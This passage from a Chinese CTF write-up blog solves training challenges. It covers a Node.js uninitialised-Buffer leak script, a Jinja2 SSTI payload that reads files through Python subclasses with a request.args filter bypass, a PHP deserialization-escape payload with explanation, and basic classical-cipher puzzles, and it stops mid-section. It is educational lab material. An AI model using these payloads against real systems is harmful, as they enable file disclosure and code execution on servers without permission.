<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># encoding&#x3D;utf-8</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;220.249.52.134:41148&#x2F;?data&#x3D;Buffer(500)&#39;</span><br><span class="line">response &#x3D; &#39;&#39;</span><br><span class="line">while &#39;flag&#39; not in response:</span><br><span class="line">        req &#x3D; requests.get(url)</span><br><span class="line">        response &#x3D; req.text</span><br><span class="line">        print(req.status_code)</span><br><span class="line">        time.sleep(0.1)</span><br><span class="line">        if &#39;flag&#123;&#39; in response:</span><br><span class="line">            print(response)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>


<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;4nother_h34rtbleed_in_n0dejs&#125;</span><br></pre></td></tr></table></figure>
<h3 id="node-js下的vm"><a href="#node-js下的vm" class="headerlink" title="node.js下的vm"></a>node.js下的vm</h3><p>一种隔离运行代码的沙箱，可以隔离当前环境上下文，但能访问当前上下文中的global变量</p>
<h3 id="node-js下的沙箱逃逸"><a href="#node-js下的沙箱逃逸" class="headerlink" title="node.js下的沙箱逃逸"></a>node.js下的沙箱逃逸</h3><p>由于js原型链的原因，可以通过contructor寻找变量prototype的方式，从而执行Function，达到沙箱逃逸的效果</p>
<h3 id="node下的Buffer"><a href="#node下的Buffer" class="headerlink" title="node下的Buffer"></a>node下的Buffer</h3><p>在较早一点的<strong>node.js</strong>版本中 (8.0 之前)，当 <code>Buffer</code> 的构造函数传入数字时, 会得到与数字长度一致的一个 <code>Buffer</code>，并且这个 <code>Buffer</code> 是未清零的。8.0 之后的版本可以通过另一个函数 <code>Buffer.allocUnsafe(size)</code> 来获得未清空的内存。</p>
<h2 id="Confusion1"><a href="#Confusion1" class="headerlink" title="Confusion1"></a>Confusion1</h2><p>考察：SSTI</p>
<p>参考</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zhengna/p/13964561.html">https://www.cnblogs.com/zhengna/p/13964561.html</a></p>
<p>进入网页，发现除了主页面，login和register都登不进去。</p>
<p>显示apache2.4.10，查询是否有相关可利用漏洞，失败。</p>
<p>根据wp，login.php和register.php下均有提示flag位置（！！！一定要查看源码，不能访问的页面也要查看</p>
<p>在URL上测试</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.134:45205&#x2F;index.php&#x2F;&#123;&#123; 1+1&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>返回2，说明可以SSTI注入</p>
<p>尝试</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;&#x2F;opt&#x2F;flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt&#39;).read()</span><br></pre></td></tr></table></figure>
<p>不能得到结果，说明有绕过</p>
<p>新姿势，通过request传参进行绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.134:45205&#x2F;index.php&#x2F;&#123;&#123; &#39;&#39;[request.args.a][request.args.b][2][request.args.c]()[40](&#39;&#x2F;opt&#x2F;flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt&#39;)[request.args.d]()&#125;&#125;?a&#x3D;__class__&amp;b&#x3D;__mro__&amp;c&#x3D;__subclasses__&amp;d&#x3D;read</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;386fd2a442e4b6841a294c2f66c864a8&#125;</span><br></pre></td></tr></table></figure>
<h3 id="SSTI新姿势"><a href="#SSTI新姿势" class="headerlink" title="SSTI新姿势"></a>SSTI新姿势</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; &#39;&#39;[request.args.a][request.args.b][2][request.args.c]()[40](&#39;&#x2F;opt&#x2F;flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt&#39;)[request.args.d]()&#125;&#125;?a&#x3D;__class__&amp;b&#x3D;__mro__&amp;c&#x3D;__subclasses__&amp;d&#x3D;read</span><br><span class="line"># 注意，字符之间的连接点没了，以及括号（）和下标[]需要放在里面</span><br></pre></td></tr></table></figure>
<h2 id="easy-serialize-php"><a href="#easy-serialize-php" class="headerlink" title="easy_serialize_php"></a>easy_serialize_php</h2><p>考察：php代码审计，php序列化</p>
<p>打开页面，打开view-source，可以看到源代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.implode(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 若已经拥有SESSION，则把SESSION删除</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>)&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br><span class="line"><span class="comment"># 将全局变量$_POST解开，相当于得到$user=&#x27;guest&#x27;,$function=$function</span></span><br><span class="line">extract(<span class="variable">$_POST</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$function</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = base64_encode(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = sha1(base64_encode(<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize_info</span> = filter(serialize(<span class="variable">$_SESSION</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = unserialize(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>根据代码，访问</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.134:58008&#x2F;index.php?f&#x3D;phpinfo</span><br></pre></td></tr></table></figure>
<p>可以php的配置信息，并得到flag的可能地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d0g3_f1ag.php</span><br></pre></td></tr></table></figure>
<p>那么按照常理，现在就应该是在URL上提交（GET方式）或POST数据提交，查看相关文件的操作了</p>
<p><strong>注意，此处有一个关键要点是通过post方式提交_SESSION，修改_SESSION中的参数，来实现查看文件</strong></p>
<p>根据代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> file_get_contents(base64_decode(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br></pre></td></tr></table></figure>
<p>所以要把d0g3_f1ag.php在base64_encode后，填充入userinfo的img下标中</p>
<p>而userinfo又是由这一句得到</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$userinfo</span> = unserialize(<span class="variable">$serialize_info</span>);</span><br></pre></td></tr></table></figure>
<p>serialize_info由$SESSION得到</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$serialize_info</span> = filter(serialize(<span class="variable">$_SESSION</span>));</span><br></pre></td></tr></table></figure>
<p>而SESSION会经过filter，且其中的img标签会被修改</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">f(!<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = base64_encode(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = sha1(base64_encode(<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>根据wp，使用php序列化的逃逸，构成下列payload（下面有解析）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[flagflag]&#x3D;&quot;;s:3:&quot;aaa&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA&#x3D;&#x3D;&quot;;&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[flagflag]&#x3D;&quot;;s:3:&quot;aaa&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mbGxsbGxsYWc&#x3D;&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>得到flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;cb08b7952dfbcf0ed90a8d07db20e139&#125; </span><br></pre></td></tr></table></figure>


<h3 id="php反序列化逃逸原理"><a href="#php反序列化逃逸原理" class="headerlink" title="php反序列化逃逸原理"></a>php反序列化逃逸原理</h3><p>首先序列化格式</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="number">2</span>) &#123; </span><br><span class="line">    [<span class="number">0</span>]=&gt; <span class="keyword">string</span>(<span class="number">8</span>) <span class="string">&quot;Hed9eh0g&quot;</span> </span><br><span class="line">    [<span class="number">1</span>]=&gt; <span class="keyword">string</span>(<span class="number">5</span>) <span class="string">&quot;aaaaa&quot;</span> </span><br><span class="line">&#125;</span><br><span class="line">序列化后会得到</span><br><span class="line"><span class="string">&#x27;a:2:&#123;i:0;s:8:&quot;Hed9eh0g&quot;;i:1;s:5:&quot;aaaaa&quot;;&#125;&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>其次，序列化有一种特点，若在序列化过程中，有一些字符被过滤替换为空，会尝试向后读取相同位数字符。如下flag被过滤的情况</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">3</span>:&#123;</span><br><span class="line">    s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;</span><br><span class="line">        s:<span class="number">24</span>:<span class="string">&quot;flagflagflagflagflagflag&quot;</span>;</span><br><span class="line">    s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;</span><br><span class="line">        s:<span class="number">59</span>:<span class="string">&quot;a&quot;</span>;</span><br><span class="line">        s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;</span><br><span class="line">        s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;</span><br><span class="line">        s:<span class="number">2</span>:<span class="string">&quot;dd&quot;</span>;</span><br><span class="line">        s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;&#125;<span class="string">&quot;;</span></span><br><span class="line"><span class="string">    s:3:&quot;</span>img<span class="string">&quot;;</span></span><br><span class="line"><span class="string">        s:20:&quot;</span>L2QwZzNfZmxsbGxsbGFn<span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">a:3:&#123;</span></span><br><span class="line"><span class="string">    s:4:&quot;</span>user<span class="string">&quot;;</span></span><br><span class="line"><span class="string">        s:24:&quot;</span><span class="string">&quot;;</span></span><br><span class="line"><span class="string">    s:8:&quot;</span><span class="function"><span class="keyword">function</span>&quot;</span>;</span><br><span class="line">        s:<span class="number">59</span>:<span class="string">&quot;a&quot;</span>;</span><br><span class="line">    s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;</span><br><span class="line">        s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;</span><br><span class="line">        s:<span class="number">2</span>:<span class="string">&quot;dd&quot;</span>;</span><br><span class="line">        s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;&#125;<span class="string">&quot;;</span></span><br><span class="line"><span class="string">    s:3:&quot;</span>img<span class="string">&quot;;</span></span><br><span class="line"><span class="string">        s:20:&quot;</span>L2QwZzNfZmxsbGxsbGFn<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure>
<p>因此，可以构造序列化字符串，绕过相关过滤</p>
<p>本题中逃逸的解析</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">未过滤前</span><br><span class="line">_SESSION[flagflag]=<span class="string">&quot;;s:3:&quot;</span>aaa<span class="string">&quot;;s:3:&quot;</span>img<span class="string">&quot;;s:20:&quot;</span>ZDBnM19mMWFnLnBocA==<span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string">序列化后</span></span><br><span class="line"><span class="string">a:2:&#123;</span></span><br><span class="line"><span class="string">	s:8:&quot;</span>flagflag<span class="string">&quot;;</span></span><br><span class="line"><span class="string">	s:58:&quot;</span></span><br><span class="line">		<span class="string">&quot;;s:3:&quot;</span>aaa<span class="string">&quot;;</span></span><br><span class="line"><span class="string">		s:3:&quot;</span>img<span class="string">&quot;;</span></span><br><span class="line"><span class="string">		s:20:&quot;</span>ZDBnM19mMWFnLnBocA==<span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string">	&quot;</span>;</span><br><span class="line">	s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;</span><br><span class="line">	s:<span class="number">20</span>:<span class="string">&quot;Z3Vlc3RfaW1nLnBuZw==&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">过滤后</span><br><span class="line">a:<span class="number">2</span>:&#123;</span><br><span class="line">	s:<span class="number">8</span>:<span class="string">&quot;&quot;</span>;</span><br><span class="line">	s:<span class="number">58</span>:<span class="string">&quot;</span></span><br><span class="line"><span class="string">		&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;aaa&quot;</span>;</span><br><span class="line">		s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;</span><br><span class="line">		s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;</span><br><span class="line">	<span class="string">&quot;;</span></span><br><span class="line"><span class="string">	s:3:&quot;</span>img<span class="string">&quot;;</span></span><br><span class="line"><span class="string">	s:20:&quot;</span>Z3Vlc3RfaW1nLnBuZw==<span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string">反序列化填充后，再序列化时</span></span><br><span class="line"><span class="string">a:2:&#123;</span></span><br><span class="line"><span class="string">	s:8:&quot;</span>s:<span class="number">58</span>:<span class="string">&quot;&quot;</span>;<span class="string">&quot;; // 字符串里的东西随便填</span></span><br><span class="line"><span class="string">		s:3:&quot;</span>aaa<span class="string">&quot;;</span></span><br><span class="line"><span class="string">	s:3:&quot;</span>img<span class="string">&quot;;</span></span><br><span class="line"><span class="string">		s:20:&quot;</span>ZDBnM19mMWFnLnBocA==<span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string">	&quot;</span>;</span><br><span class="line">	s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;</span><br><span class="line">	s:<span class="number">20</span>:<span class="string">&quot;Z3Vlc3RfaW1nLnBuZw==&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>


<h1 id="攻防世界-crypto初级"><a href="#攻防世界-crypto初级" class="headerlink" title="攻防世界 crypto初级"></a>攻防世界 crypto初级</h1><h2 id="Caesar"><a href="#Caesar" class="headerlink" title="Caesar"></a>Caesar</h2><p>考察：凯撒密码</p>
<p>根据题目提示，将得到字符串进行凯撒密码的解密即可</p>
<p>提供的字符串为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">oknqdbqmoq&#123;kag_tmhq_xqmdzqp_omqemd_qzodkbfuaz&#125;</span><br></pre></td></tr></table></figure>
<p>oknqdbqmoq部分解密后应该就是cyberspace，利用这一点算出加解密时需要的步数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;you_have_learned_caesar_encryption&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Morse"><a href="#Morse" class="headerlink" title="Morse"></a>Morse</h2><p>考察：摩斯密码</p>
<p>根据题目提示，将01字符串转换为摩斯密码。其中1为-，0为.，空格为/</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--&#x2F;---&#x2F;.-.&#x2F;...&#x2F;.&#x2F;-.-.&#x2F;---&#x2F;-..&#x2F;.&#x2F;..&#x2F;...&#x2F;...&#x2F;---&#x2F;..&#x2F;-.&#x2F;-&#x2F;.&#x2F;.-.&#x2F;.&#x2F;...&#x2F;-&#x2F;..&#x2F;-.&#x2F;--.</span><br></pre></td></tr></table></figure>
<p>使用在线转换器得到答案。注意若答案为大写，需要转换为小写后提交。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;morsecodeissointeresting&#125;</span><br></pre></td></tr></table></figure>
<h2 id="幂数加密"><a href="#幂数加密" class="headerlink" title="幂数加密"></a>幂数加密</h2><p>考察：云影密码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;WELLDOWN&#125;</span><br></pre></td></tr></table></figure>
<h3 id="云影密码"><a href="#云影密码" class="headerlink" title="云影密码"></a>云影密码</h3><p>只有84210五种数字的字符串，以0位分隔符，数字相加后转换为对应的大写英文字母。如8421=15=O</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ccehgyaefnpeoobe&#123;lcirg&#125;epriec_ora_g</span><br></pre></td></tr></table></figure>
<h2 id="Railfence"><a href="#Railfence" class="headerlink" title="Railfence"></a>Railfence</h2><p>考察：Railfence-cipher</p>
<p>根据题目提示，可能是栅栏密码。尝试后并未得出有效答案</p>
<p>根据wp，为一种变形的栅栏密码Railfence-ciper</p>
<p>代码写起来挺啰嗦的，找一个在线的解码器</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ccehgyaefnpeoobe&#123;lcirg&#125;epriec_ora_g</span><br><span class="line">cyberpeace&#123;railfence_cipher_gogogo&#125;</span><br></pre></td></tr></table></figure>
<h2 id="不仅仅是Morse"><a href="#不仅仅是Morse" class="headerlink" title="不仅仅是Morse"></a>不仅仅是Morse</h2><p>考察：Morse，培根密码</p>
<p>打开附件，得到</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--&#x2F;.-&#x2F;-.--&#x2F;..--.-&#x2F;-...&#x2F;.&#x2F;..--.-&#x2F;....&#x2F;.-&#x2F;...-&#x2F;.&#x2F;..--.-&#x2F;.-&#x2F;-.&#x2F;---&#x2F;-&#x2F;....&#x2F;.&#x2F;.-.&#x2F;..--.-&#x2F;-..&#x2F;.&#x2F;-.-.&#x2F;---&#x2F;-..&#x2F;.&#x2F;....&#x2F;....&#x2F;....&#x2F;....&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;-...&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;-...&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;-...&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;-...&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;-...&#x2F;-...&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;-...&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;-...&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;-...&#x2F;.-&#x2F;-...&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;-...&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;-...&#x2F;.-&#x2F;-...&#x2F;.-&#x2F;.-&#x2F;-...&#x2F;-...&#x2F;.-</span><br></pre></td></tr></table></figure>
<p>使用在线摩根密码<a target="_blank" rel="noopener" href="http://moersima.00cha.net/%E8%A7%A3%E5%AF%86%E5%90%8E%EF%BC%8C%E5%BE%97%E5%88%B0">http://moersima.00cha.net/解密后，得到</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">may be have another decodehhhhaaaaabaabbbaabbaaaaaaaabaababaaaaaaabbabaaabbaaabbaabaaaababaabaaabbabaaabaaabaababbaabbbabaaabababbaaabbabaaabaabaabaaaabbabbaabbaabaabaaabaabaabaababaabbabaaaabbabaabba</span><br></pre></td></tr></table></figure>
<p>abab的可能为培根密码，<a target="_blank" rel="noopener" href="http://rumkin.com/tools/cipher/baconian.php">http://rumkin.com/tools/cipher/baconian.php</a></p>
<p>解密后得到</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ATTACKANDDEFENCEWORLDISINTERESTING</span><br></pre></td></tr></table></figure>
<p>根据题目提示修改相应格式后提交flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;attackanddefenceworldisinteresting&#125;</span><br></pre></td></tr></table></figure>
<h2 id="混合编码"><a href="#混合编码" class="headerlink" title="混合编码"></a>混合编码</h2><p>考察：ASCII码，base64编码</p>
<p><strong>第一步</strong></p>
<p>打开文件，发现以==结尾，为base64编码，解码后得到字符串</p>
<p><strong>第二步</strong></p>
<p>没小于128的，猜测是ASCII码，写个python转换一下</p>
